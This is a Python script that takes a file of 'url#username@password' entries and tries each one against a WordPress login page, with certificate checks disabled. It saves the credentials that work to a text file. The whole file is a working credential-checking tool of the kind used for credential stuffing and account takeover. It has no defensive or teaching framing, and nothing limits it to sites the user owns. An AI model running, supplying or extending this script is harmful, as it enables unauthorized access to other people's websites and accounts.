import requests
from colorama import Fore, Style, init
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama for colored output
init(autoreset=True)

def check_wordpress_login(url, username, password):
    login_data = {
        'log': username,   # WordPress login field name for username
        'pwd': password,   # WordPress login field name for password
        'wp-submit': 'Log In',
        'redirect_to': url,
        'testcookie': '1'
    }

    # Start a session to manage cookies
    with requests.Session() as session:
        try:
            # Attempt login
            login_response = session.post(url, data=login_data, timeout=10, verify=False)

            # Check if login was successful by inspecting the response URL or status
            if login_response.status_code == 200 and "login" not in login_response.url:
                return True  # Login successful
            else:
                return False  # Login failed

        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}Error connecting to {url}: {e}")
            return False

def main():
    success_logins = []
    codes = input("Enter Your List : ")
    with open(codes, 'r') as file:
        # Read each line in the file
        for line in file:
            try:
                # Split the line into URL, username, and password using the '#' and '@User' separator
                url, login_info = line.strip().split('#')
                username, password = login_info.split('@')[:2]  # Extract the username and password
            except ValueError:
                print(f"{Fore.YELLOW}Invalid line format: {line.strip()}")
                continue
            
            # Attempt to log in
            success = check_wordpress_login(url, username, password)
            
            # Output the result with colored text
            if success:
                print(f"{Fore.GREEN}Login successful for {url} with username {username}")
                # Save successful login attempt
                success_logins.append(f"{url}#{username}@{password}@User")
            else:
                print(f"{Fore.RED}Login failed for {url} with username {username}")
    
    # Save all successful logins to success.txt
    if success_logins:
        with open('wordpress_ate_success.txt', 'w') as success_file:
            for login in success_logins:
                success_file.write(login + '\n')
        print(f"{Fore.CYAN}\nAll successful logins have been saved to success.txt")
    else:
        print(f"{Fore.YELLOW}\nNo successful logins to save.")

if __name__ == "__main__":
    main()
